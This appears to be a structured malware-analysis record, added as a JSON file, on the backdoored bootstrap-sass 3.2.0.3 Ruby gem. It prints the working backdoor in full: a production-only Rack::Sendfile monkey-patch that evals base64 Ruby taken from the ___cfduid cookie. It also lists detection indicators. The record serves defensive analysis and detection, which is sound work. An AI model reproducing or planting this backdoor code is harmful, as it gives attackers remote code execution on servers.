@@ -1,0 +1,80 @@
+{
+  "package_info": {
+    "package_name": "bootstrap-sass",
+    "package_manager": "RubyGems",
+    "package_versions": "3.2.0.3",
+    "why_malicious": "Version 3.2.0.3 of bootstrap-sass introduces a malicious file (lib/active-controller/middleware.rb) that backdoors the application by monkey-patching Rack::Sendfile middleware. This code enables remote code execution by evaluating attacker-supplied, base64-encoded Ruby code from a specially crafted HTTP cookie (___cfduid), allowing attackers to execute arbitrary commands on any server running the affected version. This represents a critical compromise of server integrity and security."
+  },
+  "malicious_snippets": [
+    {
+      "snippet_id": "snippet_1",
+      "execution_context": {
+        "trigger": "import-time (when the gem is loaded in a Rails application, specifically in production environments)",
+        "file_location": "lib/active-controller/middleware.rb",
+        "required_permissions": [
+          "filesystem (to load the malicious file)",
+          "environment_vars (to check Rails.env)",
+          "network (to receive attacker-supplied HTTP cookies)"
+        ]
+      },
+      "code_snippet": "begin\n require 'rack/sendfile'\n if Rails.env.production?\n   Rack::Sendfile.tap do |r|\n     r.send :alias_method, :c, :call\n     r.send(:define_method, :call) do |e|\n       begin\n         x = Base64.urlsafe_decode64(e['http_cookie'.upcase].scan(/___cfduid=(.+);/).flatten[0].to_s)\n         eval(x) if x\n       rescue Exception\n       end\n       c(e)\n     end\n   end\n end\nrescue Exception\n nil\nend",
+      "code_language": "ruby",
+      "code_behavior": "At import-time in production environments, the code monkey-patches the Rack::Sendfile middleware's call method, extracts the ___cfduid cookie from each HTTP request, base64-decodes its value, and evaluates it as Ruby code, resulting in remote code execution by anyone able to control the cookie.",
+      "malice_analysis": {
+        "why_suspicious": "The code dynamically redefines a core middleware method to execute arbitrary Ruby code supplied by a client via an HTTP cookie. This is a textbook backdoor technique, as it allows attackers to inject and run any code on the server without authentication.",
+        "violated_expectations": "Legitimate middleware should never execute code from user-supplied cookies or redefine core methods at runtime. The expected behavior is to securely process HTTP requests, not to introduce dynamic code execution paths based on untrusted input.",
+        "similar_legitimate_use": "Monkey-patching is sometimes used in Ruby for bug fixes or instrumentation, but it is never acceptable to use it for executing user-supplied code from cookies. No legitimate use case exists for this pattern in production middleware.",
+        "key_indicators": [
+          "Monkey-patching of Rack::Sendfile's call method at import-time",
+          "Extraction and base64-decoding of the ___cfduid cookie from HTTP requests",
+          "Use of eval to execute decoded cookie data as Ruby code",
+          "Conditional execution restricted to production environment (Rails.env.production?)",
+          "Silent exception handling to suppress errors and avoid detection"
+        ]
+      }
+    }
+  ],
+  "attack_chain": [
+    {
+      "step": 1,
+      "action": "Malicious code is loaded when the gem is imported in a Rails application running in production, due to the presence of the malicious file.",
+      "implemented_by": [
+        "snippet_1"
+      ],
+      "leads_to": "The Rack::Sendfile middleware is monkey-patched to intercept and modify HTTP request handling."
+    },
+    {
+      "step": 2,
+      "action": "For each incoming HTTP request, the modified call method checks for the ___cfduid cookie, base64-decodes its value, and evaluates it as Ruby code.",
+      "implemented_by": [
+        "snippet_1"
+      ],
+      "leads_to": "An attacker can send specially crafted cookies to execute arbitrary code on the server."
+    },
+    {
+      "step": 3,
+      "action": "The attacker achieves remote code execution on the server, enabling persistent and stealthy access and potential full system compromise.",
+      "implemented_by": [
+        "snippet_1"
+      ],
+      "leads_to": "Final goal: persistent, stealthy remote access and control of the compromised server."
+    }
+  ],
+  "detection_knowledge": {
+    "behavioral_signatures": [
+      "Monkey-patching of core middleware methods, specifically Rack::Sendfile#call, at import-time",
+      "Use of eval on data extracted from HTTP cookies within middleware",
+      "Base64 decoding of cookie values immediately before code execution",
+      "Silent exception handling (rescue Exception) around dynamic code execution in middleware"
+    ],
+    "file_indicators": [
+      "Presence of lib/active-controller/middleware.rb (file does not exist in legitimate versions of bootstrap-sass)",
+      "Code that redefines or monkey-patches Rack::Sendfile#call in any gem or application file"
+    ],
+    "network_indicators": [
+      "Inbound HTTP requests containing ___cfduid cookies with base64-encoded payloads",
+      "Unusual or malformed ___cfduid cookies in HTTP requests to Rails applications using bootstrap-sass 3.2.0.3"
+    ],
+    "how_to_detect": "Scan for the presence of lib/active-controller/middleware.rb in bootstrap-sass 3.2.0.3 installations. Analyze code for monkey-patching of Rack::Sendfile and the use of eval on base64-decoded cookie data. Monitor HTTP traffic for ___cfduid cookies containing base64-encoded payloads. Alert on any code that executes user-supplied data from cookies, especially in production environments. Flag any silent exception handling around dynamic code execution in middleware."
+  }
+}
